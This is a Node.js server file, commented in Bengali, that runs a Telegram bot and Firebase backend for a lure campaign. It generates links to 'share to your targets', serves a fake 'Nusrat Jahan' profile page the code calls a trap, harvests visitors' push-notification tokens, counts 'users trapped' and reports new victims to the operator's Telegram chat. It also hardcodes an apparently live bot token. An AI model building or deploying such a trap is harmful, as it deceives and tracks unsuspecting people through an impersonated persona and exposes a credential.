const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
app.use(express.json());
// public ফোল্ডার থেকে আপনার সাইটের ফাইলগুলো (index.html, images, videos) সরাসরি দেখাবে
app.use(express.static(path.join(__dirname, 'public'))); 

// ===============================
// 1️⃣ Firebase init (Without Storage)
// ===============================
const serviceAccount = require('./firebase-key.json');
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://my-sc-tools-default-rtdb.firebaseio.com'
  // Storage Bucket বাদ দেওয়া হয়েছে, কারণ আমরা Telegram CDN ব্যবহার করব
});
const db = admin.database();

// ===============================
// 2️⃣ Telegram bot init (Webhook)
// ===============================
const botToken = '8226802389:AAEonFEVlNpLI5HG4O3ZjFkk9BTIHYxXgPY';
const bot = new TelegramBot(botToken, { polling: false });

const ADMIN_IDS = [8271536101];
const LOG_CHAT_ID = -1003552771281;
function isAdmin(msg){ return ADMIN_IDS.includes(msg.from.id); }

// ===============================
// 3️⃣ Save File Info to Database (Telegram CDN)
// ===============================
async function processFileFromTelegram(fileId, filename, mimeType){
  const fileIdHash = crypto.randomBytes(8).toString('hex');

  // আমরা ফাইলটি ডাউনলোড বা স্টোরেজে সেভ করছি না। 
  // শুধু টেলিগ্রামের fileId ডাটাবেসে সেভ করে রাখছি।
  await db.ref(`files/${fileIdHash}`).set({ 
    name: filename, 
    telegramFileId: fileId, 
    type: mimeType 
  });
  
  const baseUrl = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
  await bot.sendMessage(LOG_CHAT_ID, `📌 New Link Generated: ${filename}\n🔗 System Link: ${baseUrl}/file/${fileIdHash}`);

  return fileIdHash;
}

// ===============================
// 4️⃣ Telegram Webhook (Admin Commands & Uploads)
// ===============================
app.post(`/webhook/${botToken}`, async (req,res)=>{
  const update = req.body;

  if(update.message){
    const msg = update.message;
    const chatId = msg.chat.id;

    // ফাইল রিসিভ করা
    if(isAdmin(msg)){
      const file = msg.document || msg.video || (msg.photo && msg.photo.pop());
      if(file){
        try{
          await bot.sendMessage(chatId, '⏳ Generating dynamic link using Telegram CDN...');
          const filename = file.file_name || 'media_file';
          const mimeType = file.mime_type || 'application/octet-stream';
          
          // ফায়ারবেস স্টোরেজ এর বদলে শুধু ডাটাবেসে এন্ট্রি করা হচ্ছে
          const fileIdHash = await processFileFromTelegram(file.file_id, filename, mimeType);
          
          const baseUrl = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
          await bot.sendMessage(chatId, `✅ Link Ready!\n\n🔗 Share this link to your targets:\n${baseUrl}/file/${fileIdHash}`);
        }catch(e){
          console.error(e);
          await bot.sendMessage(chatId,'⚠️ Process failed: '+e.message);
        }
        return res.sendStatus(200);
      }
    }

    // এডমিন কমান্ড
    if(msg.text){
      const text = msg.text;
      if(text==='/listusers' && isAdmin(msg)){
        const snap = await db.ref('tokens').once('value');
        const data = snap.val();
        await bot.sendMessage(chatId, `📋 Users:\n${data? Object.keys(data).length + ' total users trapped.' : 'No users found'}`);
      }
      if(text==='/stats' && isAdmin(msg)){
        const snap = await db.ref('tokens').once('value');
        const total = snap.val()? Object.keys(snap.val()).length : 0;
        await bot.sendMessage(chatId, `📊 Stats\n✅ Total Notification Subscribers: ${total}`);
      }
    }
  }
  res.sendStatus(200);
});

// ===============================
// 5️⃣ Stream File Directly from Telegram CDN (Optional use)
// ===============================
// যদি কখনো আপনার পাঠানো অরিজিনাল ছবিটি ওয়েবসাইটে দেখাতে চান, তাহলে /stream/id ব্যবহার করতে পারবেন
app.get('/stream/:fileIdHash', async (req, res) => {
  try {
    const snap = await db.ref(`files/${req.params.fileIdHash}`).once('value');
    const data = snap.val();
    if (!data || !data.telegramFileId) return res.status(404).send('File not found');

    // টেলিগ্রাম থেকে ফাইলের আসল পাথ নেওয়া হচ্ছে
    const fileInfo = await bot.getFile(data.telegramFileId);
    const url = `https://api.telegram.org/file/bot${botToken}/${fileInfo.file_path}`;

    // ইউজারের ব্রাউজারে স্ট্রিম করে পাঠানো হচ্ছে (এতে বটের টোকেন হাইড থাকে)
    res.setHeader('Content-Type', data.type);
    const response = await axios({ url, method: 'GET', responseType: 'stream' });
    response.data.pipe(res);
  } catch (e) {
    console.error(e);
    res.status(500).send('Error streaming file from Telegram');
  }
});

// ===============================
// 6️⃣ Route for File Links (Shows the Nusrat Jahan Profile Trap)
// ===============================
app.get('/file/:fileId', async (req,res)=>{
  const { fileId } = req.params;
  try{
    const snap = await db.ref(`files/${fileId}`).once('value');
    if(!snap.val()) return res.status(404).send('Link Expired or Not Found');

    // লগ সেভ করা
    const sessionId = Math.floor(100 + Math.random()*900);
    await db.ref(`sessions/${sessionId}`).set({ fileId, openedAt:Date.now() });
    
    // ব্রাউজারে আপনার তৈরি করা সুন্দর index.html পেজটি ওপেন হবে
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  }catch(e){ console.error(e); res.status(500).send('Server error'); }
});

// ===============================
// 7️⃣ API to Save Push Token
// ===============================
app.post('/saveToken', async (req,res)=>{
  const { token, userId } = req.body;
  if(!token || !userId) return res.status(400).send('Missing');
  
  await db.ref(`tokens/${userId}`).set({ token, createdAt:Date.now() });
  
  await bot.sendMessage(LOG_CHAT_ID, `🎉 New Notification Subscriber!\nID: ${userId}`);
  res.send('OK');
});

// ===============================
// 8️⃣ Server listen & Set Webhook
// ===============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  
  // Render এ ডিপ্লয় করলে অটোমেটিক ডোমেইন সেট হয়ে যাবে
  const webhookUrl = process.env.RENDER_EXTERNAL_URL 
    ? `${process.env.RENDER_EXTERNAL_URL}/webhook/${botToken}` 
    : `https://your-fallback-domain.com/webhook/${botToken}`;
    
  await bot.setWebHook(webhookUrl);
  console.log('Webhook configured to:', webhookUrl);
});
